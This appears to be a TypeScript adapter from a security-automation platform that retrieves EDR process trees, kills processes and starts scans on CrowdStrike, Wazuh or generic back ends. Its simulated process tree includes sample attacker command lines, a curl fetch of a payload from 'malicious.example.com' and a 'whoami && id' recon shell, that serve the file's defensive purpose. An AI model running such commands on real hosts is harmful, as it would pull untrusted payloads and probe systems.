/**
 * Process Tree / EDR Data Adapter
 *
 * Handles EDR data retrieval, process termination, and scan initiation.
 * Supports CrowdStrike, Wazuh, and generic EDR vendors.
 *
 * Actions: retrieve_edr_data, kill_process, start_edr_scan
 *
 * @module adapters/edr/process-tree-adapter
 */

import type {
  StepAction,
  ExecutionMode,
  AdapterResult,
  AdapterConfig,
} from '../../types/playbook.ts';
import {
  BaseAdapter,
  type AdapterCapabilities,
  type HealthCheckResult,
  type ValidationResult,
} from '../adapter-interface.ts';

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

type EDRVendor = 'crowdstrike' | 'wazuh' | 'generic';

type ScanType = 'quick' | 'full';

interface ProcessTreeEntry {
  pid: number;
  name: string;
  parent_pid: number;
  command_line: string;
  user: string;
  hash: string;
  start_time: string;
}

// ---------------------------------------------------------------------------
// Process Tree Adapter
// ---------------------------------------------------------------------------

export class ProcessTreeAdapter extends BaseAdapter {
  readonly name = 'edr-process-tree';
  readonly version = '1.0.0';
  readonly supportedActions: readonly StepAction[] = [
    'retrieve_edr_data',
    'kill_process',
    'start_edr_scan',
  ] as const;

  // -------------------------------------------------------------------------
  // Lifecycle
  // -------------------------------------------------------------------------

  override async initialize(config: AdapterConfig): Promise<void> {
    await super.initialize(config);

    const vendor = this.getVendor();
    const validVendors: EDRVendor[] = ['crowdstrike', 'wazuh', 'generic'];
    if (!validVendors.includes(vendor)) {
      throw new Error(
        `ProcessTreeAdapter: unsupported vendor '${vendor}'. ` +
          `Valid vendors: ${validVendors.join(', ')}`,
      );
    }
  }

  // -------------------------------------------------------------------------
  // Execute
  // -------------------------------------------------------------------------

  override async execute(
    action: StepAction,
    params: Record<string, unknown>,
    mode: ExecutionMode,
  ): Promise<AdapterResult> {
    this.assertInitialized();
    this.assertSupportsAction(action);

    const start = performance.now();

    try {
      if (mode === 'dry-run') {
        return this.executeDryRun(action, params, start);
      }

      if (mode === 'simulation') {
        return this.executeSimulation(action, params, start);
      }

      return await this.executeProduction(action, params, start);
    } catch (err) {
      const durationMs = Math.round(performance.now() - start);
      const message = err instanceof Error ? err.message : String(err);
      return this.failureResult(action, durationMs, 'EXECUTION_ERROR', message, true);
    }
  }

  // -------------------------------------------------------------------------
  // Rollback
  // -------------------------------------------------------------------------

  override async rollback(
    action: StepAction,
    _params: Record<string, unknown>,
  ): Promise<AdapterResult> {
    this.assertInitialized();

    // Only kill_process has a rollback concept, but processes cannot truly
    // be restarted. All other actions are read-only or non-reversible.
    if (action === 'kill_process') {
      return this.failureResult(
        action,
        0,
        'ROLLBACK_NOT_POSSIBLE',
        'Process termination cannot be fully rolled back',
        false,
      );
    }

    return this.failureResult(
      action,
      0,
      'ROLLBACK_NOT_SUPPORTED',
      `Adapter '${this.name}' does not support rollback for '${action}'`,
      false,
    );
  }

  // -------------------------------------------------------------------------
  // Health Check
  // -------------------------------------------------------------------------

  override async healthCheck(): Promise<HealthCheckResult> {
    if (!this.initialized || !this.config) {
      return {
        status: 'unknown',
        message: 'Adapter not initialized',
        checkedAt: new Date().toISOString(),
      };
    }

    const baseUrl = this.getBaseUrl();
    const start = performance.now();

    try {
      const response = await fetch(`${baseUrl}/health`, {
        method: 'GET',
        headers: this.buildHeaders(),
        signal: AbortSignal.timeout(10_000),
      });

      const latencyMs = Math.round(performance.now() - start);

      if (response.ok) {
        return {
          status: 'healthy',
          message: 'EDR API reachable',
          latencyMs,
          checkedAt: new Date().toISOString(),
        };
      }

      return {
        status: 'degraded',
        message: `EDR API returned status ${response.status}`,
        latencyMs,
        checkedAt: new Date().toISOString(),
      };
    } catch (err) {
      const latencyMs = Math.round(performance.now() - start);
      const message = err instanceof Error ? err.message : String(err);
      return {
        status: 'unhealthy',
        message: `EDR API unreachable: ${message}`,
        latencyMs,
        checkedAt: new Date().toISOString(),
      };
    }
  }

  // -------------------------------------------------------------------------
  // Capabilities
  // -------------------------------------------------------------------------

  override getCapabilities(): AdapterCapabilities {
    return {
      supportedActions: this.supportedActions,
      supportsSimulation: true,
      supportsRollback: false,
      supportsValidation: true,
      maxConcurrency: 5,
    };
  }

  // -------------------------------------------------------------------------
  // Validate Parameters
  // -------------------------------------------------------------------------

  async validateParameters(
    action: StepAction,
    params: Record<string, unknown>,
  ): Promise<ValidationResult> {
    const errors: string[] = [];

    if (!this.supportedActions.includes(action)) {
      errors.push(`Unsupported action: '${action}'`);
      return { valid: false, errors };
    }

    switch (action) {
      case 'retrieve_edr_data':
        if (!hasStringParam(params, 'host_id') && !hasStringParam(params, 'host')) {
          errors.push("Parameter 'host_id' or 'host' is required for retrieve_edr_data");
        }
        break;

      case 'kill_process':
        if (!hasStringParam(params, 'host_id')) {
          errors.push("Parameter 'host_id' is required for kill_process");
        }
        if (params.pid === undefined || params.pid === null) {
          errors.push("Parameter 'pid' is required for kill_process");
        } else if (typeof params.pid !== 'number' && typeof params.pid !== 'string') {
          errors.push("Parameter 'pid' must be a number or numeric string");
        }
        break;

      case 'start_edr_scan':
        if (!hasStringParam(params, 'host_id') && !hasStringParam(params, 'host')) {
          errors.push("Parameter 'host_id' or 'host' is required for start_edr_scan");
        }
        if (params.scan_type !== undefined) {
          const validScanTypes: ScanType[] = ['quick', 'full'];
          if (!validScanTypes.includes(params.scan_type as ScanType)) {
            errors.push("Parameter 'scan_type' must be 'quick' or 'full'");
          }
        }
        break;
    }

    return errors.length > 0 ? { valid: false, errors } : { valid: true };
  }

  // -------------------------------------------------------------------------
  // Private: Mode Handlers
  // -------------------------------------------------------------------------

  private executeDryRun(
    action: StepAction,
    params: Record<string, unknown>,
    start: number,
  ): AdapterResult {
    const durationMs = Math.round(performance.now() - start);
    const host = (params.host as string | undefined)
      ?? (params.host_id as string | undefined)
      ?? 'unknown';

    const descriptions: Record<string, string> = {
      retrieve_edr_data: `Would retrieve EDR process tree from host '${host}'`,
      kill_process: `Would kill process PID ${params.pid ?? 'unknown'} on host '${host}'`,
      start_edr_scan: `Would start ${(params.scan_type as string) ?? 'quick'} EDR scan on host '${host}'`,
    };

    return this.successResult(action, durationMs, {
      dry_run: true,
      action,
      host,
      message: descriptions[action] ?? `Would execute ${action}`,
    });
  }

  private executeSimulation(
    action: StepAction,
    params: Record<string, unknown>,
    start: number,
  ): AdapterResult {
    const durationMs = Math.round(performance.now() - start);
    const host = (params.host as string | undefined)
      ?? (params.host_id as string | undefined)
      ?? 'unknown';

    switch (action) {
      case 'retrieve_edr_data':
        return this.successResult(action, durationMs, {
          simulated: true,
          host,
          process_tree: this.buildSampleProcessTree(params.pid as number | undefined),
        }, { mode: 'simulation', vendor: this.getVendor() });

      case 'kill_process':
        return this.successResult(action, durationMs, {
          simulated: true,
          host,
          pid: params.pid,
          killed: true,
          message: `Simulated kill of PID ${params.pid ?? 'unknown'} on host '${host}'`,
        }, { mode: 'simulation', vendor: this.getVendor() });

      case 'start_edr_scan': {
        const scanType = (params.scan_type as ScanType) ?? 'quick';
        return this.successResult(action, durationMs, {
          simulated: true,
          host,
          scan_id: `sim-scan-${Date.now()}`,
          scan_type: scanType,
          status: 'initiated',
          message: `Simulated ${scanType} EDR scan on host '${host}'`,
        }, { mode: 'simulation', vendor: this.getVendor() });
      }

      default:
        return this.failureResult(
          action,
          durationMs,
          'UNSUPPORTED_ACTION',
          `Action '${action}' is not supported`,
          false,
        );
    }
  }

  private async executeProduction(
    action: StepAction,
    params: Record<string, unknown>,
    start: number,
  ): Promise<AdapterResult> {
    switch (action) {
      case 'retrieve_edr_data':
        return this.executeRetrieveEDRData(params, start);
      case 'kill_process':
        return this.executeKillProcess(params, start);
      case 'start_edr_scan':
        return this.executeStartEDRScan(params, start);
      default:
        return this.failureResult(
          action,
          Math.round(performance.now() - start),
          'UNSUPPORTED_ACTION',
          `Action '${action}' is not supported`,
          false,
        );
    }
  }

  // -------------------------------------------------------------------------
  // Private: Production Action Handlers
  // -------------------------------------------------------------------------

  private async executeRetrieveEDRData(
    params: Record<string, unknown>,
    start: number,
  ): Promise<AdapterResult> {
    const action: StepAction = 'retrieve_edr_data';
    const hostId = await this.resolveHostId(params);
    const baseUrl = this.getBaseUrl();
    const vendor = this.getVendor();

    let url: string;
    if (vendor === 'crowdstrike') {
      url = `${baseUrl}/devices/entities/processes/v1?device_id=${encodeURIComponent(hostId)}`;
      if (params.pid !== undefined) {
        url += `&pid=${encodeURIComponent(String(params.pid))}`;
      }
    } else {
      url = `${baseUrl}/api/processes?host_id=${encodeURIComponent(hostId)}`;
      if (params.pid !== undefined) {
        url += `&pid=${encodeURIComponent(String(params.pid))}`;
      }
    }

    const response = await fetch(url, {
      method: 'GET',
      headers: this.buildHeaders(),
      signal: AbortSignal.timeout(this.getTimeoutMs()),
    });

    const durationMs = Math.round(performance.now() - start);

    if (!response.ok) {
      const body = await response.text().catch(() => 'No response body');
      return this.failureResult(
        action,
        durationMs,
        'API_ERROR',
        `EDR API returned ${response.status}: ${body}`,
        response.status >= 500,
      );
    }

    const body = (await response.json()) as Record<string, unknown>;
    const processTree = (body.resources ?? body.processes ?? body.data ?? []) as ProcessTreeEntry[];

    return this.successResult(action, durationMs, {
      host_id: hostId,
      process_tree: processTree,
    }, {
      mode: 'production',
      vendor,
      status_code: response.status,
    });
  }

  private async executeKillProcess(
    params: Record<string, unknown>,
    start: number,
  ): Promise<AdapterResult> {
    const action: StepAction = 'kill_process';
    const hostId = params.host_id as string;
    const pid = params.pid;
    const baseUrl = this.getBaseUrl();
    const vendor = this.getVendor();

    let url: string;
    let requestBody: Record<string, unknown>;

    if (vendor === 'crowdstrike') {
      url = `${baseUrl}/real-time-response/entities/command/v1`;
      requestBody = {
        device_id: hostId,
        command_string: `kill ${pid}`,
        base_command: 'kill',
      };
    } else {
      url = `${baseUrl}/api/processes/kill`;
      requestBody = {
        host_id: hostId,
        pid: Number(pid),
      };
    }

    const response = await fetch(url, {
      method: 'POST',
      headers: this.buildHeaders(),
      body: JSON.stringify(requestBody),
      signal: AbortSignal.timeout(this.getTimeoutMs()),
    });

    const durationMs = Math.round(performance.now() - start);

    if (!response.ok) {
      const body = await response.text().catch(() => 'No response body');
      return this.failureResult(
        action,
        durationMs,
        'API_ERROR',
        `EDR API returned ${response.status}: ${body}`,
        response.status >= 500,
      );
    }

    const body: unknown = await response.json().catch(() => ({}));

    return this.successResult(action, durationMs, {
      host_id: hostId,
      pid: Number(pid),
      killed: true,
      api_response: body,
    }, {
      mode: 'production',
      vendor,
      status_code: response.status,
    });
  }

  private async executeStartEDRScan(
    params: Record<string, unknown>,
    start: number,
  ): Promise<AdapterResult> {
    const action: StepAction = 'start_edr_scan';
    const hostId = await this.resolveHostId(params);
    const scanType: ScanType = (params.scan_type as ScanType) ?? 'quick';
    const baseUrl = this.getBaseUrl();
    const vendor = this.getVendor();

    let url: string;
    let requestBody: Record<string, unknown>;

    if (vendor === 'crowdstrike') {
      url = `${baseUrl}/scanner/entities/scans/v1`;
      requestBody = {
        hosts: [hostId],
        scan_type: scanType,
      };
    } else {
      url = `${baseUrl}/api/scans`;
      requestBody = {
        host_id: hostId,
        scan_type: scanType,
      };
    }

    const response = await fetch(url, {
      method: 'POST',
      headers: this.buildHeaders(),
      body: JSON.stringify(requestBody),
      signal: AbortSignal.timeout(this.getTimeoutMs()),
    });

    const durationMs = Math.round(performance.now() - start);

    if (!response.ok) {
      const body = await response.text().catch(() => 'No response body');
      return this.failureResult(
        action,
        durationMs,
        'API_ERROR',
        `EDR API returned ${response.status}: ${body}`,
        response.status >= 500,
      );
    }

    const body = (await response.json()) as Record<string, unknown>;
    const scanId = (body.scan_id ?? body.id ?? `scan-${Date.now()}`) as string;

    return this.successResult(action, durationMs, {
      host_id: hostId,
      scan_id: scanId,
      scan_type: scanType,
      status: 'initiated',
      api_response: body,
    }, {
      mode: 'production',
      vendor,
      status_code: response.status,
    });
  }

  // -------------------------------------------------------------------------
  // Private: Host ID Resolution
  // -------------------------------------------------------------------------

  /**
   * Resolve a host ID from params. If only a hostname is provided,
   * look it up via the EDR API.
   */
  private async resolveHostId(
    params: Record<string, unknown>,
  ): Promise<string> {
    if (typeof params.host_id === 'string' && params.host_id.length > 0) {
      return params.host_id;
    }

    const hostname = params.host as string | undefined;
    if (!hostname) {
      throw new Error("Parameter 'host' or 'host_id' is required");
    }

    return this.lookupHostId(hostname);
  }

  /**
   * Look up a host ID by hostname via the EDR API.
   */
  private async lookupHostId(hostname: string): Promise<string> {
    const baseUrl = this.getBaseUrl();
    const vendor = this.getVendor();

    let url: string;
    if (vendor === 'crowdstrike') {
      url = `${baseUrl}/devices/queries/devices/v1?filter=hostname:'${encodeURIComponent(hostname)}'`;
    } else {
      url = `${baseUrl}/api/hosts?hostname=${encodeURIComponent(hostname)}`;
    }

    const response = await fetch(url, {
      method: 'GET',
      headers: this.buildHeaders(),
      signal: AbortSignal.timeout(this.getTimeoutMs()),
    });

    if (!response.ok) {
      throw new Error(
        `Host lookup failed for '${hostname}': API returned ${response.status}`,
      );
    }

    const body = (await response.json()) as Record<string, unknown>;

    if (vendor === 'crowdstrike') {
      const resources = body.resources as string[] | undefined;
      if (!resources || resources.length === 0) {
        throw new Error(`Host not found: '${hostname}'`);
      }
      return resources[0] as string;
    }

    const hostId = (body.host_id ?? body.id) as string | undefined;
    if (!hostId) {
      throw new Error(`Host not found: '${hostname}'`);
    }
    return hostId;
  }

  // -------------------------------------------------------------------------
  // Private: Simulation Data
  // -------------------------------------------------------------------------

  private buildSampleProcessTree(filterPid?: number): ProcessTreeEntry[] {
    const tree: ProcessTreeEntry[] = [
      {
        pid: 1,
        name: 'systemd',
        parent_pid: 0,
        command_line: '/sbin/init',
        user: 'root',
        hash: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2',
        start_time: '2026-01-15T08:00:00Z',
      },
      {
        pid: 1234,
        name: 'bash',
        parent_pid: 1,
        command_line: '/bin/bash',
        user: 'analyst',
        hash: 'b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3',
        start_time: '2026-02-10T10:30:00Z',
      },
      {
        pid: 5678,
        name: 'python3',
        parent_pid: 1234,
        command_line: 'python3 suspicious_script.py',
        user: 'analyst',
        hash: 'c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4',
        start_time: '2026-02-10T10:31:15Z',
      },
      {
        pid: 5679,
        name: 'curl',
        parent_pid: 5678,
        command_line: 'curl -s http://malicious.example.com/payload',
        user: 'analyst',
        hash: 'd4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5',
        start_time: '2026-02-10T10:31:20Z',
      },
      {
        pid: 5680,
        name: 'sh',
        parent_pid: 5678,
        command_line: 'sh -c whoami && id',
        user: 'analyst',
        hash: 'e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6',
        start_time: '2026-02-10T10:31:25Z',
      },
    ];

    if (filterPid !== undefined) {
      return tree.filter((p) => p.pid === filterPid || p.parent_pid === filterPid);
    }

    return tree;
  }

  // -------------------------------------------------------------------------
  // Private: Helpers
  // -------------------------------------------------------------------------

  private getVendor(): EDRVendor {
    return (this.config?.config.vendor as EDRVendor) ?? 'generic';
  }

  private getBaseUrl(): string {
    const url = this.config?.config.base_url as string | undefined;
    if (!url) {
      throw new Error('ProcessTreeAdapter: base_url is not configured');
    }
    return url.replace(/\/+$/, '');
  }

  private getApiKey(): string | undefined {
    return this.config?.credentials?.credentials.api_key;
  }

  private getTimeoutMs(): number {
    return (this.config?.timeout ?? 30) * 1000;
  }

  private buildHeaders(): Record<string, string> {
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
    };

    const apiKey = this.getApiKey();
    if (apiKey) {
      const vendor = this.getVendor();
      if (vendor === 'crowdstrike') {
        headers['Authorization'] = `Bearer ${apiKey}`;
      } else {
        headers['X-API-Key'] = apiKey;
      }
    }

    return headers;
  }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function hasStringParam(
  params: Record<string, unknown>,
  key: string,
): boolean {
  return typeof params[key] === 'string' && (params[key] as string).length > 0;
}
